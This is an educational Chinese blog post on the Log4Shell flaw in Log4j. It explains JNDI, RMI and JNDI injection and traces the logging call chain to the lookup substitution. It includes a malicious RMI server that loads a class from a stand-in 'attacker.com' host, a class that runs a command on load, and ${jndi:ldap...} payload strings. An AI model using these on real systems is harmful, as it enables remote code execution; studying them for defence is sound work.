

# CVE-2021-44428 | 对 Apache Log4jshell 的深入学习与思考



### 0x00 写在前面

> ​     本来想着在此篇文章中包含一些Log4jshell bypass思路，以及涉及影响产品的内容，但是由于整体文章结构以及自身技术水平的限制，推到下一篇文章了。本篇文章主要讲述Log4jshell的形成原理，以及JNDI注入的详细原理，本人java水平有限，文章内容大致为其他大佬分享整合+个人理解，如果有错误的地方请mail我并指出，欢迎大家讨论。



### 0x01 漏洞简介

***CVE编号***  : CVE-2021-44228

***CVSS分数*** ：10.0 关键

***漏洞描述*** :

> Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to “true” or it can be mitigated in prior releases (<2.10) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).
>
> Apache Log4j2 版本 2.14.x 及以下版本存在远程代码执行漏洞。攻击者可在任何可记录在日志消息的参数中进行 JNDI 注入。当启用消息查找替换时，攻击者可以控制日志消息或日志消息的参数并执行从 LDAP 服务器加载的任意代码。



### 0x02 JNDI & 注入

在此之前，先来聊聊一些基础内容:



#### JNDI 

JNDI( **J** ava **N** aming and **D** irectory **I** nterface) 是用于目录服务的 **Java API** ，它允许 Java 软件客户端通过名称发现和查找数据和资源（以 Java 对象的形式）。与所有与主机系统交互的 Java API 一样，JNDI 独立于底层实现。此外，它还指定了一个服务提供接口 (SPI)，允许将目录服务实现插入到框架中。

简单来说，JNDI 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。 

![image-20220110221326565](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110221326565.png)

JNDI提供了一个`API`来与不同类型的服务进行交互，`Nameing Manager`包含用于通过位置信息引用来创建上下文对象与对象的静态方法（转码解析）。`JNDI SPI` 允许JNDI管理不同的服务


JNDI的SPI部分几乎支持任何类型的命名服务(Naming Service)、目录服务(Directory Service)，包括:

- LDAP
- DNS
- NIS
- CORBA name service 
- file system

一个小例子:

```java
// Create the Initial Context configured to work with an RMI Registry
Hashtable env = new Hashtable();
env.put(INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(PROVIDER_URL, "rmi://localhost:1099");
Context ctx = new InitialContext(env);
// Bind a String to the name “foo” in the RMI Registry
ctx.bind("foo", "Sample String");
// Look up the object
Object local_obj = ctx.lookup("foo");
```

或使用ldap:

```java
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389");
```



#### JNDI Naming References (JNDI 命名参考)

如果我们想将Java对象绑定到命名服务或目录服务，需要使该对象是可以被序列化的，或能够通过序列化方式进行编码传输的。

如果不能够进行序列化，那么JNDI中给出了两种命名参考来进行引用

JNDI Naming References

- Reference Addresses:这基本上是我们想要绑定到命名服务的对象的最终地址，所以当我们执行lookup操作时，我们将收到jndi reference，**Naming Manager将解码这个命名引用**，得到地址，然后我们将使用这个地址来获取最终的对象，并将其返回给应用程序代码。
  - 例:rmi://server/ref
- Remote Factory:在这种情况下，不是指向一个远程对象，而是指向一个需要用来实际实例化需要返回最终数据的远程`Factory Class`（类工厂），进行lookup，收到jndi reference并跟踪`factory name`和`factory location`，接下来从远程位置安装该远程类，然后实例化该Factory以生成我们的对象



#### RMI远程方法的调用方式:

远程方法调用(Remote Method Invocation)是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过`序列化方式`进行`编码传输`的，所以对象也需要是可以被序列化的形式。

**远程对象** 

使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。 


任何可以被远程调用方法的对象必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。如下： 

![image-20220110234601016](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110234601016.png)

注: IHello是客户端和服务端共用的接口（客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其全限定名必须与服务器上的对象完全相同），HelloImpl是一个服务端远程对象，提供了一个sayHello方法供远程调用。它没有继承UnicastRemoteObject类或者实现java.rmi.Remote接口，而是在构造方法中调用了UnicastRemoteObject.exportObject()。 


在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的： 

![image-20220110234616040](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110234616040.png)



从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。 


Server端监听一个端口，这个端口是JVM随机选择的；


Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； 


Client端可以调用Stub上的方法； 


Stub连接到Server端监听的通信端口并提交参数； 


远程Server端上执行具体的方法，并返回结果给Stub； 



Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； 


那怎么获取Stub呢？ 



Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。 


要注册远程对象，需要RMI URL和一个远程对象的引用。 

![image-20220110234713258](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110234713258.png)

LocateRegistry.getRegistry()会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。 

![image-20220110234722153](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110234722153.png)

使用RMI Registry之后，RMI的调用关系是这样的： 

![image-20220110234843426](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110234843426.png)

所以其实从客户端角度看，服务端应用是有两个端口的，一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）。这个通信细节比较重要，真实利用过程中可能会在这里遇到一些坑。

RMI核心特点之一就是动态类加载，**如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class**，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 


这个概念比较重要，JNDI注入的利用方法中也借助了动态加载类的思路。 


这里涉及到的角色：客户端、RMI注册表、远程对象服务器、托管class文件的Web服务器可以分别位于不同的主机上： 

![image-20220110234918169](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110234918169.png)



#### JNDI注入


> JNDI API在初始化时，可以将相关协议的URL作为参数传入，而JNDI注入就出现在客户端的`lookup()`函数中，如果`lookup()`的参数`可控`就可能被攻击。

JNDI注入流程图:


![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/EiaFNWe.png)

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/JrtmsZJ.png)



**Dynamic Protocol Switching**

> 顺便一提:JNDI实现了Dynamic Protocol Switching ,如果攻击者能够提供URL绝对路径，那么可以覆盖绑定的类型选项和URL

这是一个简单的示例:

```java
// 创建初始环境
Hashtable env = new Hashtable();
env.put(INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(PROVIDER_URL, "rmi://secure-server:1099");
Context ctx = new InitialContext(env);
//在本地RMI注册表中查找
Object local_obj = ctx.lookup(<攻击者能够控制的内容，在这里插入URL绝对路径，那么将可以覆盖初始环境中绑定的类型和URL>);
```



**JNDI加载远程类的安全性** :

在下图中可以看出，JNDI在从远程位置中加载远程类时的安全控制。在使用`RMI`协议加载远程类时，需要启用其JVM属性，以允许远程类加载，并且总是启用安全管理器执行安全控制。 `LDAP`协议 同样需要启用其JVM属性，但在默认情况下不启用，并且没有执行安全管理器，所以当开发人员启用了LDAP协议的JVM属性后，将可以加载远程类。NamingManager层并不需要启用JVM属性，且不受安全管理器保护，就可以加载远程类(当然是被动，后面会说)。

![image-20220110231136436](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110231136436.png)

可以看出RMI与CORBA相比于LDAP相对安全许多，但是看向Naming Manager和流程图，我们就会发现很多问题

![image-20220110235344994](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110235344994.png)

Naming Manager无需配置开启，且没有安全管理器进行安全保护。Naming Manager的作用是解码JNDI SPI层，并且连接上下文，那么就需要获取Remote Factory 以及 Reference Addresses 。

在2016年的blackhat大会中，**Alvaro Muñoz** 与 **Oleksandr Mirosh**分享了RMI、CORBA与LDAP中可以用来完成RCE的主要向量

- RMI

  - JNDI Reference
  - Remote Object
- CORAB

  - IOR
- LDAP

  - Serialized Object
  - JNDI Reference
  - Remote Location


举个栗子:

```java
package jndiInject;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

public class SERVER {

    public static void main(String args[]) throws Exception {

        Registry registry = LocateRegistry.createRegistry(1099);
        //注意看厦航Reference
        Reference aa = new Reference("ExecTest", "ExecTest", "http://127.0.0.1:8081/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'");
        registry.bind("aa", refObjWrapper);

    }

}
```

```java
#编译后为ExecTest.class
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import javax.print.attribute.standard.PrinterMessageFromOperator;
public class ExecTest {
    public ExecTest() throws IOException,InterruptedException{
        String cmd="whoami";
        final Process process = Runtime.getRuntime().exec(cmd);
        printMessage(process.getInputStream());;
        printMessage(process.getErrorStream());
        int value=process.waitFor();
        System.out.println(value);
    }

    private static void printMessage(final InputStream input) {
        // TODO Auto-generated method stub
        new Thread (new Runnable() {
            @Override
            public void run() {
                // TODO Auto-generated method stub
                Reader reader =new InputStreamReader(input);
                BufferedReader bf = new BufferedReader(reader);
                String line = null;
                try {
                    while ((line=bf.readLine())!=null)
                    {
                        System.out.println(line);
                    }
                }catch (IOException  e){
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
```





**下面使用RMI服务作为示例**:

在RMI服务中，除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。 

整个利用流程如下： 



1. 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； 

2. 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； 

3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； 

4. 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 

5. 攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果； 




在这里，攻击目标扮演的相当于是JNDI客户端的角色，攻击者通过搭建一个恶意的RMI服务端来实施攻击。我们跟入lookup()函数的代码中，可以看到JNDI中对Reference类的处理逻辑，最终会调用NamingManager.getObjectInstance()： 

![image-20220111002117445](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220111002117445.png)

调用链： 

-> RegistryContext.decodeObject()
-> NamingManager.getObjectInstance()
-> factory.getObjectInstance()
Tips：JNDI查找远程对象时InitialContext.lookup(URL)的参数URL可以覆盖一些上下文中的属性，比如：Context.PROVIDER_URL。
Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，可以进行JNDI注入。
Matthias Kaiser(@matthias_kaiser)发现com.sun.rowset.JdbcRowSetImpl类的execute()也可以触发JNDI注入利用，调用过程如下：
-> JdbcRowSetImpl.execute()
-> JdbcRowSetImpl.prepare()
-> JdbcRowSetImpl.connect()
-> InitialContext.lookup(dataSource)

简单来说:

在RMI、CORBA协议利用时，需要由Naming Manager 解码解析，实际上在JDK1.8.0_241更新以后，LDAP协议也需要由Naming Manager解码解析了。

在做解析时，Naming Manager会先获取一个 `JNDI Reference`对象（当然是我们恶意生成的），接下来 Naming Manager 的 `javax.naming.spi.NamingManager#getObjectFactoryFromReference`方法,会先从本地的CLASSPATH中寻找该类,如果没有该类，则会去远程加载类。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。



**再举个例子**:

这是一个存在漏洞的系统:

```java
	@RequestMapping("/lookup")
	@Example(uri = {"/lookup?name=java:comp/env"})
	public Object lookup(@RequestParam String name) throws Exception{
	    return new javax.naming.InitialContext().lookup(name);
	}
```



通过请求“/lookup/?name=ldap://127.0.0.1:1389/Object” URL，我们可以使易受攻击的服务器连接到我们控制的地址。要触发远程类加载，恶意 RMI 服务器可以使用以下配置：

```java
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //creating a reference with 'ExportObject' factory with the factory location of 'http://_attacker.com_/'
        Reference ref = new javax.naming.Reference("ExportObject","ExportObject","http://_attacker.com_/");
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

由于目标服务器不知道“ExploitObject”，它的字节码将从“http[:]//_attacker.com_/ExploitObject.class”加载并执行，触发RCE。

当然，我初学这些，关于相关的文章我会放在底部，希望以上内容没有什么问题。



### 0x03 Log4jShell 漏洞分析

在了解了相关漏洞情报和查看了[相关补丁更改记录](https://github.com/apache/logging-log4j2/pull/608/commits/7fe72d62fcb9246be792b946e405e1d40d402780)可以得出，该漏洞是通过jndi中LDAP注入的方式导致了RCE，并在对lookup函数进行了判断修改后又限制了jndi对LDAP的访问

翻阅[官方文档](https://logging.apache.org/log4j/2.x/manual/lookups.html)中关于lookup的说明

> Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the [StrLookup](https://logging.apache.org/log4j/2.x/log4j-core/apidocs/org/apache/logging/log4j/core/lookup/StrLookup.html) interface. Information on how to use Lookups in configuration files can be found in the [Property Substitution](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) section of the [Configuration](https://logging.apache.org/log4j/2.x/manual/configuration.html) page.
>
> lookup 提供了⼀种在任意位置向 Log4j2 配置添加值的⽅法，是实现 StrLookup 接⼝的特殊类型 的插件。



且 log4j支持的方法：

base64 、 data 、 ctx 、 main 、 env 、 sys 、 sd 、 java 、 marker 、 jndi 、 jvmrunargs 、 map 、 bundle 、 log4j



在官方文档中给出了JNDI lookup的用法说明

> JndiLookup 允许通过 JNDI 检索变量。默认情况下，该键将以 java:comp/env/ 为前缀，但是如果该键包含“:”，则不会添加前缀。

```html
<File name="Application" fileName="application.log">
  <PatternLayout>
    <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
  </PatternLayout>
</File>
```

在Log4j 2.17.0之前存在漏洞的版本中，默认存在漏洞，且支持ldap协议，在之后需要设置[enableJndiLookup](https://logging.apache.org/log4j/2.x/manual/configuration.html#enableJndiLookup)且只支持java协议

实际上log4j中jndi的用法格式为:

```apl
${jndi:JNDIContent}
```

既然明确了漏洞出发的方法，那么就要去找入口点:

**LogManager.getLogger().xxxx()** 方法便是传入jndi语句的入口点

在log4j中，共有8个日志级别，可以通过 **LogManager.getLogger()** 调用记录日志的方法如
下：

```ABAP
LogManager.getLogger().error()
LogManager.getLogger().fatal()

LogManager.getLogger().trace()
LogManager.getLogger().traceExit()
LogManager.getLogger().traceEntry()
LogManager.getLogger().info()
LogManager.getLogger().warn()
LogManager.getLogger().debug()
LogManager.getLogger().log()
LogManager.getLogger().printf() 
```

在默认情况下，error()和fatal()方法可以触发漏洞，其余方法需要令行配置，并且可以通过isInfoEnabled()和其他函数检查状态:

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/0hO8mv0.png)

原因是在logIfEnabled方法中，对当前日志等级进行了一次判断:

![image-20220109223725056](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220109223725056.png)

该方法返回一个布尔值，只有在当前事件的日志等级大于或等于设置的日志等级时，才会符合条件，当返回值为 **True** 时，将继续 **logMessage()** 方法。

这里拿error举例说明:

```java
Logger logger = LogManager.getLogger();
logger.error("error message: {}",${jndi:rmi://<ip>/<ref>});
```



查看error的类继承关系可以发现，实际上被调用的是 **AbstractLogger.java** 中的 **public void eror()** 方法

![image-20220109224832257](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220109224832257.png)

当消息进入到error()方法时，会传入到logIfEnabled()中进行逻辑判断日志等级

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/Q322PjY.png)

当isEnabled()返回True后，将会继续logMessage()方法

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/kP2QX9y.png)



logMessage() 调用 logMessageSafely()：

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/lBakv7R.png)



ogMessageSafely() 调用 logMessageTrackRecursion()

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/0OcSQFo.png)

 logMessageTrackRecursion() 调用 tryLogMessage()

```java
private void tryLogMessage(final String fqcn,
                           final StackTraceElement location,
                           final Level level,
                           final Marker marker,
                           final Message message,
                           final Throwable throwable) {
    try {
        log(level, marker, fqcn, location, message, throwable);
    } catch (final Exception e) {
        handleLogMessageException(e, fqcn, message);
    }
}
```



不动态调试的情况下跟`log`方法会到`AbstractLogger.log`方法，实际上这里是`org.apache.logging.log4j.core.Loggger.log`方法

```java
@Override
protected void log(final Level level, final Marker marker, final String fqcn, final StackTraceElement location,
                   final Message message, final Throwable throwable) {
    final ReliabilityStrategy strategy = privateConfig.loggerConfig.getReliabilityStrategy();
    if (strategy instanceof LocationAwareReliabilityStrategy) {
        // 触发点
        ((LocationAwareReliabilityStrategy) strategy).log(this, getName(), fqcn, location, marker, level,
                                                          message, throwable);
    } else {
        strategy.log(this, getName(), fqcn, marker, level, message, throwable);
    }
}
```

跟入这里的`log`方法到`org/apache/logging/log4j/core/config/DefaultReliabilityStrategy.log`

```java
@Override
public void log(final Supplier<LoggerConfig> reconfigured, final String loggerName, final String fqcn,
                final StackTraceElement location, final Marker marker, final Level level, final Message data,
                final Throwable t) {
    loggerConfig.log(loggerName, fqcn, location, marker, level, data, t);
}
```

进入`LoggerConfig.log`方法

```java
@PerformanceSensitive("allocation")
    public void log(final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker,
        final Level level, final Message data, final Throwable t) {
        // 无需关心的代码
        ...
        try {
            // 跟入
            log(logEvent, LoggerConfigPredicate.ALL);
        } finally {
            ReusableLogEventFactory.release(logEvent);
        }
    }
```



`LoggerConfig`另一处重载`log`方法

```java
protected void log(final LogEvent event, final LoggerConfigPredicate predicate) {
    if (!isFiltered(event)) {
        // 跟入
        processLogEvent(event, predicate);
    }
}
```



**processLogEvent** 

```java
private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) {
    event.setIncludeLocation(isIncludeLocation());
    if (predicate.allow(this)) {
        // 关键点
        callAppenders(event);
    }
    logParent(event, predicate);
}
```

可以看到调用`appender.control`的`callAppenders`方法

```java
@PerformanceSensitive("allocation")
protected void callAppenders(final LogEvent event) {
    final AppenderControl[] controls = appenders.get();
    //noinspection ForLoopReplaceableByForEach
    for (int i = 0; i < controls.length; i++) {
        controls[i].callAppender(event);
    }
}
```



层层跟入到`AppenderControl.tryCallAppender`方法

```java
private void callAppender0(final LogEvent event) {
    ensureAppenderStarted();
    if (!isFilteredByAppender(event)) {
        // 跟入
        tryCallAppender(event);
    }
}
```

```java
private void tryCallAppender(final LogEvent event) {
    try {
        // 跟入
        appender.append(event);
    } catch (final RuntimeException error) {
        handleAppenderError(event, error);
    } catch (final Exception error) {
        handleAppenderError(event, new AppenderLoggingException(error));
    }
}
```

进入`AbstractOutputStreamAppender.append`方法，进入到`directEncodeEvent`方法

```java
protected void directEncodeEvent(final LogEvent event) {
    getLayout().encode(event, manager);
    if (this.immediateFlush || event.isEndOfBatch()) {
        manager.flush();
    }
}
```

关注其中的`encode`方法跟入到`PatternLayout.encode`方法

```java
@Override
public void encode(final LogEvent event, final ByteBufferDestination destination) {
    if (!(eventSerializer instanceof Serializer2)) {
        super.encode(event, destination);
        return;
    }
    final StringBuilder text = toText((Serializer2) eventSerializer, event, getStringBuilder());
    final Encoder<StringBuilder> encoder = getStringBuilderEncoder();
    encoder.encode(text, destination);
    trimToMaxSize(text);
}
```

不用关心 `encode` 方法中多余的代码，这里触发点在`toText`方法

```java
private StringBuilder toText(final Serializer2 serializer, final LogEvent event,
                             final StringBuilder destination) {
    return serializer.toSerializable(event, destination);
}
```

从`toText`中转入`toSerializable`

```java
@Override
public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
    final int len = formatters.length;
    for (int i = 0; i < len; i++) {
        // 发现其中某一处format方法触发漏洞
        formatters[i].format(event, buffer);
    }
    if (replace != null) {
        String str = buffer.toString();
        str = replace.format(str);
        buffer.setLength(0);
        buffer.append(str);
    }
    return buffer;
}
```

这里的`formatters`方法包含了多个`formatter`对象，其中出发漏洞的是第8个，其中包含`MessagePatternConverter`

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/0115.png)

跟入看到调用了`Converter`相关的方法

```java
public void format(final LogEvent event, final StringBuilder buf) {
    if (skipFormattingInfo) {
        converter.format(event, buf);
    } else {
        formatWithInfo(event, buf);
    }
}
```

不难看出每个`formatter`和`converter`为了构造日志的每一部分，这里在构造真正的日志信息字符串部分

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/0116.png)

跟入`MessagePatternConverter.format`方法，看到核心的部分

```java
@Override
public void format(final LogEvent event, final StringBuilder toAppendTo) {
    final Message msg = event.getMessage();
    if (msg instanceof StringBuilderFormattable) {

        final boolean doRender = textRenderer != null;
        final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;

        final int offset = workingBuilder.length();
        if (msg instanceof MultiFormatStringBuilderFormattable) {
            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);
        } else {
            ((StringBuilderFormattable) msg).formatTo(workingBuilder);
        }
        if (config != null && !noLookups) {
            for (int i = offset; i < workingBuilder.length() - 1; i++) {
                // 是否以${开头
                if (workingBuilder.charAt(i) == '$' && workingBuilder.charAt(i + 1) == '{') {
                    // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName}
                    final String value = workingBuilder.substring(offset, workingBuilder.length());
                    workingBuilder.setLength(offset);
                    // 跟入replace方法
                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));
                }
            }
        }
        if (doRender) {
            textRenderer.render(workingBuilder, toAppendTo);
        }
        return;
    }
    if (msg != null) {
        String result;
        if (msg instanceof MultiformatMessage) {
            result = ((MultiformatMessage) msg).getFormattedMessage(formats);
        } else {
            result = msg.getFormattedMessage();
        }
        if (result != null) {
            toAppendTo.append(config != null && result.contains("${")
                              ? config.getStrSubstitutor().replace(event, result) : result);
        } else {
            toAppendTo.append("null");
        }
    }
}
```



上面的步骤其实是一环套一环，排除一些不关键的调用路径，过程如下:

logMessage > logMessageSafely > logMessageTrackRecursion > tryLogMessage > log > DefaultReliabilityStrategy.log >  loggerConfig.log > processLogEvent > callAppenders > tryCallAppender >  append  >  tryAppend > directEncodeEvent > encode >  toText > toSerializable > format > PatternFormatter.format

第一个关键点在上文中 **PatternFormatter.java** 中的 **format** 方法:

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/1GGzyGv.png)

红框标记内容为:

如果 config 不为 null，并且 nolookups 变量设置为 false，它将继续检查字符串是否以 **${**  开头（ 如果递归检测到 **$** 字符后跟了一个 **{** 字符，那么会对直到 **}** 中间的内容进行解析）

红框上方的内容:

```java
if (config != null && !noLookups)
```

如果`config` 不为 `null` ，并且 `nolookups` 变量设置为 `false`，才会继续 `${` 字符串检查

那么nsLookups又是从何而来?

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/CI5bpET.png)

这是一个布尔值，它取决于 `Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS` 和 `noLookupsIdx >= 0`

`noLookupsIdx` 来自 `loadNoLookups(options)`

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/UElyLdC.png)

`NOLOOKUPS` 是一个常数

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/EWDGXBc.png)

由于没有提供 `loadNoLookups()`中所需的`options` loadNoLookups() 将返回 `-1`，这使得 noLookupsIdx >= 0 为 `false`。

那么常量来自属性值：

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/QtfS6I1.png)



再看下面那行

```ABAP
workingBuilder.append(config.getStrSubstitutor().replace(event, value));
```

进入StrSubstitutor.replace方法


```java
public String replace(final LogEvent event, final String source) {
    if (source == null) {
        return null;
    }
    final StringBuilder buf = new StringBuilder(source);
    // 跟入
    if (!substitute(event, buf, 0, source.length())) {
        return source;
    }
    return buf.toString();
}
```



跟入`StrSubstitutor.substitute`方法，存在递归，逻辑较长,主要作用是递归处理日志输入，转为对应的输出

```java
private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length,
                       List<String> priorVariables) {
    ...
    substitute(event, bufName, 0, bufName.length());
    ...
    String varValue = resolveVariable(event, varName, buf, startPos, endPos);
    ...
    int change = substitute(event, buf, startPos, varLen, priorVariables);
}
```

